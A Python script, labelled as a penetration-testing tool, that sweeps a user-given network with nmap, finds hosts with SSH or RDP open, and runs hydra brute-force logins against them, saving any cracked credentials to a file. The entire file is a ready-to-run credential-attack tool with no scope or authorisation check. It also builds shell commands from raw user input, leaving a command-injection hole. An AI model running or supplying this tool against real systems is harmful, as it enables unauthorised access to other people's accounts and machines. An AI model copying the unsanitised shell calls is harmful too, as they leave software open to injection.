import asyncio
import subprocess
import re

# Function to run a command in the shell asynchronously
async def run_command(command):
    # Create an asynchronous subprocess with separate output and error pipes
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    # Wait for the process to complete and capture the output and errors
    stdout, stderr = await process.communicate()
    # Return the output as a decoded string
    return stdout.decode()

# Function to perform an nmap scan on a given target (IP, CIDR, or domain)
async def scan_targets(target):
    # Run nmap for ping scanning to check which hosts are up
    command = f"nmap -sP {target}"
    result = await run_command(command)
    # Extract IP addresses using regular expressions
    active_hosts = re.findall(r'(\d+\.\d+\.\d+\.\d+)', result)
    return active_hosts

# Function to scan specific ports (22 and 3389) on a given IP address
async def scan_ports(ip):
    # Run nmap to check if ports 22 and 3389 are open
    command = f"nmap -p 22,3389 {ip}"
    result = await run_command(command)
    ports = {}
    # Check for open SSH port
    if "22/tcp open" in result:
        ports[22] = 'ssh'
    # Check for open RDP port
    if "3389/tcp open" in result:
        ports[3389] = 'rdp'
    return ports

# Function to perform a brute force attack using hydra on a specific IP and port
async def brute_force(ip, port, service):
    # Specify the files containing usernames and passwords for the brute force attack
    username_list = "usernames.txt"  # Your list of usernames
    password_list = "passwords.txt"  # Your list of passwords
    # Command to run hydra for brute forcing the specified service
    command = f"hydra -L {username_list} -P {password_list} {service}://{ip} -s {port}"
    result = await run_command(command)
    # Check if any valid login was found
    if "login:" in result:
        # Write the successful brute force results to a file
        with open("BRUTEFORCE.txt", "a") as file:
            file.write(f"{ip} {port} {service} {result}\n")

# Main function to run the entire process
async def main():
    # Get the target for the pen test from the user
    target = input("Enter the pen test target (IP, CIDR, or domain): ")
    # Scan the target to find active hosts
    active_hosts = await scan_targets(target)
    tasks = []
    # For each active host, create a task to check open ports
    for ip in active_hosts:
        task = asyncio.create_task(scan_ports(ip))
        tasks.append(task)
    # Wait for all tasks to complete
    ports_info = await asyncio.gather(*tasks)
    # For each host and their open ports, attempt brute force attacks
    for i, ip in enumerate(active_hosts):
        for port, service in ports_info[i].items():
            await brute_force(ip, port, service)

# Entry point of the script
if __name__ == "__main__":
    asyncio.run(main())
